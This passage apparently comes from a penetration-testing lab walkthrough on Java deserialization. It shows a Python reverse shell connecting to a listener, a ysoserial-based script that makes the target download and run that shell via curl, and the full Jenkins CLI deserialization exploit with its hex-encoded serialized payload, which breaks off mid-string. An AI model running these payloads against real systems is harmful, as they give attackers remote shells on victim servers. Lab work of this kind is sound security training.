+<p>Save this code as rev.py in the root directory.</p>
+
+<p>Code:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="sh">'</span><span class="s">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="sh">"</span><span class="s">192.46.20.2</span><span class="sh">"</span><span class="s">,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">-i</span><span class="sh">"</span><span class="s">]);</span><span class="sh">'</span>
+</code></pre></div></div>
+
+<p>Step 2: Then let’s host the above using Python’s SimpleHTTPServer module in the directory where rev is present.</p>
+
+<p>Command:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">SimpleHTTServer</span> <span class="mi">8443</span>
+</code></pre></div></div>
+
+<p>Step 3: In another terminal window, start a Netcat listener.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 443
+</code></pre></div></div>
+
+<p>Step 4: Finally, the exploit is changed to generate the respective payloads one after the other.</p>
+
+<ul>
+  <li>Download the reverse shell</li>
+  <li>Make it executable</li>
+  <li>Start the shell</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload <span class="o">=</span> <span class="s1">'CommonsCollections2'</span>
+commands <span class="o">=</span> <span class="o">[</span>
+<span class="s1">'"curl http://192.91.247.2:8443/rev.py -O rev.py"'</span>,
+<span class="s1">'"chmod +x rev.py"'</span>,
+<span class="s1">'"./rev.py"'</span>
+<span class="o">]</span>
+
+<span class="k">for </span><span class="nb">command </span><span class="k">in </span>commands:
+  os.system<span class="o">(</span><span class="s2">"java -jar /root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar "</span> + payload + <span class="s2">" "</span> + <span class="nb">command</span> + <span class="s2">" &gt; "</span> + payload<span class="o">)</span>
+  <span class="nv">x</span><span class="o">=</span>threading.Thread<span class="o">(</span><span class="nv">target</span><span class="o">=</span>upload, <span class="nv">args</span><span class="o">=(</span>payload,<span class="o">))</span>
+  x.start<span class="o">()</span>
+  readfile<span class="o">(</span>payload<span class="o">)</span>
+  time.sleep<span class="o">(</span>2<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Below you can find the full exploit code.</p>
+
+<p>Save this as exploit.py and execute the file.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py
+</code></pre></div></div>
+
+<p>Code:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">time</span>
+<span class="kn">import</span> <span class="n">threading</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="k">def</span> <span class="nf">readfile</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+  <span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://demo.ine.local/upload/index.php?sent=OK</span><span class="sh">"</span>
+  <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+  <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Used filename: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
+  <span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+  <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+  <span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://demo.ine.local/upload/upload.php</span><span class="sh">"</span>
+  <span class="n">files</span> <span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">uploaded_file</span><span class="sh">'</span><span class="p">:</span> <span class="nf">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)}</span>
+  <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sh">'</span><span class="s">CommonsCollections2</span><span class="sh">'</span>
+<span class="n">commands</span> <span class="o">=</span> <span class="p">[</span>
+<span class="sh">'"</span><span class="s">curl http://192.91.247.2:8443/rev.py -O rev.py</span><span class="sh">"'</span><span class="p">,</span>
+<span class="sh">'"</span><span class="s">chmod +x rev.py</span><span class="sh">"'</span><span class="p">,</span>
+<span class="sh">'"</span><span class="s">./rev.py</span><span class="sh">"'</span>
+<span class="p">]</span>
+
+<span class="k">for</span> <span class="n">command</span> <span class="ow">in</span> <span class="n">commands</span><span class="p">:</span>
+  <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">java -jar /root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar </span><span class="sh">"</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="sh">"</span><span class="s"> </span><span class="sh">"</span> <span class="o">+</span> <span class="n">command</span> <span class="o">+</span> <span class="sh">"</span><span class="s"> &gt; </span><span class="sh">"</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+  <span class="n">x</span><span class="o">=</span><span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">upload</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">payload</span><span class="p">,))</span>
+  <span class="n">x</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+  <span class="nf">readfile</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+  <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> 
+</code></pre></div></div>
+
+<blockquote>
+  <p>Successfully achieved remote code execution.</p>
+</blockquote>
+
+<h2 id="lab-2">Lab 2</h2>
+
+<p>Solution</p>
+
+<p>Step 1: Start the lab. Wait until the lab is ready. Once the lab is ready, the kali Linux interface will be available on the browser.</p>
+
+<p>Step 2: Scan the network with Nmap and gather the information about the target machine.</p>
+
+<p>Use the following command to get the information about open ports and services in the network.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap demo.ine.local
+</code></pre></div></div>
+
+<p>Got the information about the IP address and the ports which are open in the target machine.</p>
+
+<p>Step 3: Inspect the Jenkins application by navigating to the IP address at port 8080 in the web browser.</p>
+
+<p>Target URL:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.24.161.3:8080/
+</code></pre></div></div>
+
+<p>Step 4: Copy and paste the python exploit code and save it as exploit.py.</p>
+
+<p>Source: https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py</p>
+
+<p>Code:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+# usage: ./jenkins.py host port /path/to/payload
+</span><span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">base64</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+<span class="c1"># Query Jenkins over HTTP to find what port the CLI listener is on
+</span><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://</span><span class="sh">'</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="sh">'</span><span class="s">:</span><span class="sh">'</span> <span class="o">+</span> <span class="n">port</span><span class="p">)</span>
+<span class="n">cli_port</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">X-Jenkins-CLI-Port</span><span class="sh">'</span><span class="p">])</span>
+
+<span class="c1"># Open a socket to the CLI port
+</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">cli_port</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">connecting to %s port %s</span><span class="sh">'</span> <span class="o">%</span> <span class="n">server_address</span><span class="p">)</span>
+<span class="n">sock</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">server_address</span><span class="p">)</span>
+
+<span class="c1"># Send headers
+</span><span class="n">headers</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74</span><span class="sh">'</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">sending </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"'</span> <span class="o">%</span> <span class="n">headers</span><span class="p">)</span>
+<span class="n">sock</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">headers</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="k">print</span> <span class="o">&gt;&gt;</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">,</span> <span class="sh">'</span><span class="s">received </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"'</span> <span class="o">%</span> <span class="n">data</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="k">print</span> <span class="o">&gt;&gt;</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">,</span> <span class="sh">'</span><span class="s">received </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"'</span> <span class="o">%</span> <span class="n">data</span>
+
+<span class="n">payloadObj</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
+<span class="n">payload_b64</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">payloadObj</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="sh">'</span><span class="se">\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e</span><span class="sh">'</span><span class="o">+</span><span class="n">payload_b64</span><span class="o">+</span><span class="sh">'</span><span class="se">\x00\x00\x00\x00\x11\x2d\xac\xed\x00\x05\x73\x72\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x4c\x00\x10\x63\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x50\x72\x6f\x78\x79\x74\x00\x30\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x3b\x5b\x00\x07\x72\x65\x71\x75\x65\x73\x74\x74\x00\x02\x5b\x42\x4c\x00\x08\x74\x6f\x53\x74\x72\x69\x6e\x67\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x03\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x78\x70\x00\x00\x00\x0c\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x03\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x3c\x74\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x74\x00\x10\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x04\x63\x61\x6c\x6c\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x3c\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x70\x73\x7d\x00\x00\x00\x02\x00\x2e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x00\x1c\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x49\x52\x65\x61\x64\x52\x65\x73\x6f\x6c\x76\x65\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x72\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x05\x5a\x00\x14\x61\x75\x74\x6f\x55\x6e\x65\x78\x70\x6f\x72\x74\x42\x79\x43\x61\x6c\x6c\x65\x72\x5a\x00\x09\x67\x6f\x69\x6e\x67\x48\x6f\x6d\x65\x49\x00\x03\x6f\x69\x64\x5a\x00\x09\x75\x73\x65\x72\x50\x72\x6f\x78\x79\x4c\x00\x06\x6f\x72\x69\x67\x69\x6e\x71\x00\x7e\x00\x0d\x78\x70\x00\x00\x00\x00\x00\x02\x00\x73\x71\x00\x7e\x00\x0b\x71\x00\x7e\x00\x43\x74\x00\x78\x50\x72\x6f\x78\x79\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x40\x32\x20\x77\x61\x73\x20\x63\x72\x65\x61\x74\x65\x64\x20\x66\x6f\x72\x20\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x75\x71\x00\x7e\x00\x11\x00\x00\x00\x0d\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x7d\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x89\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x74\x00\x04\x77\x72\x61\x70\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x6a\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x06\x65\x78\x70\x6f\x72\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x02\xa6\x74\x00\x21\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x74\x00\x16\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x4a\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x46\x71\x00\x7e\x00\x1d\x71\x00\x7e\x00\x1e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x22\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x26\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x71\x00\x7e\x00\x28\x70\x71\x00\x7e\x00\x29\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x2b\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x71\x00\x7e\x00\x30\x71\x00\x7e\x00\x31\x71\x00\x7e\x00\x32\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x34\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x36\x71\x00\x7e\x00\x3a\x78\x78\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x07\x46\xac\xed\x00\x05\x73\x72\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\x49\x00\x03\x6f\x69\x64\x5b\x00\x09\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x05\x74\x79\x70\x65\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x77\x08\xff\xff\xff\xfe\x00\x00\x00\x02\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x